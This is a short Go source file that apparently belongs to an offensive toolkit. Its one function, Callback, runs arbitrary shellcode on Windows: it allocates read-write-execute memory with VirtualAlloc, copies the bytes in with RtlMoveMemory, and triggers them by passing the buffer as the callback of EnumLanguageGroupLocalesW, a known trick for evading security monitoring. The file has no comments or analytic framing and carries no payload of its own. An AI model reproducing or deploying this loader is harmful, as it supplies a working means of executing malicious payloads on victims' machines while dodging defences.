package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	LGRPID_ARABIC          = 0x000d
)

var (
	kernel32                  = syscall.MustLoadDLL("kernel32.dll")
	ntdll                     = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc              = kernel32.MustFindProc("VirtualAlloc")
	EnumLanguageGroupLocalesW = kernel32.MustFindProc("EnumLanguageGroupLocalesW")
	RtlMoveMemory             = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	EnumLanguageGroupLocalesW.Call(addr, LGRPID_ARABIC, 0, 0)
}
